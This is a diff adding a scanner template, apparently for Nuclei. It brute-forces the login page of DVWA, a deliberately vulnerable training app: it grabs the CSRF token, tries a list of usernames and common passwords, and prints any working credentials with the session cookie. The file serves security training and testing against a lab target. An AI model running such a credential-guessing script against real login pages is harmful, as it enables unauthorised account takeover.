@@ -1,0 +1,118 @@
+id: dvwa-brute-force-main-login
+
+info:
+  name: DVWA Brute Force - Mian Login
+  author: Dylan Shield (Shieldia.co)
+  severity: high
+  description: Attempts to brute force the DVWA main login page.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: dvwa,brute-force
+
+variables:
+  usernames:
+    - "admin"
+    - "1337"
+    - "gordonb"
+    - "pablo"
+    - "smithy"
+  passwords:
+    - "eminem"
+    - "matthew"
+    - "robert"
+    - "danielle"
+    - "forever"
+    - "family"
+    - "jonathan"
+    - "98765432"
+    - "computer"
+    - "whatever"
+    - "dragon"
+    - "vanessa"
+    - "cookie"
+    - "naruto"
+    - "summer"
+    - "sweety"
+    - "spongebob"
+    - "joseph"
+    - "junior"
+    - "softball"
+    - "taylor"
+    - "yellow"
+    - "daniela"
+    - "lauren"
+    - "mickey"
+    - "princesa"
+    - "buster"
+    - "george"
+    - "brittany"
+    - "alejandra"
+    - "patricia"
+    - "rachel"
+    - "tequiero"
+    - "7777777"
+    - "cheese"
+    - "159753"
+    - "password"
+    - "charley"
+    - "abc123"
+    - "letmein"
+
+flow: |
+  http(1);
+  for (let user of iterate(template["usernames"])) {
+    set("user", user);
+    for (let pass of iterate(template["passwords"])) {
+      set("pass", pass);
+      http(2);
+    }
+  }
+
+
+http:
+  # Step 1: Authenticate and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  - raw:
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+
+        username={{user}}&password={{pass}}&user_token={{token}}&Login=Login
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Location: index.php"
+
+    extractors:
+      - type: regex
+        name: phpsess
+        part: header
+        group: 1
+        regex:
+          - PHPSESSID=([a-zA-Z0-9+]{26})
+        internal: true
+      - type: dsl
+        name: user pass
+        dsl:
+          - "concat('Username: ',user,' Password: ', pass, ' PHPSESSID: ', phpsess)"
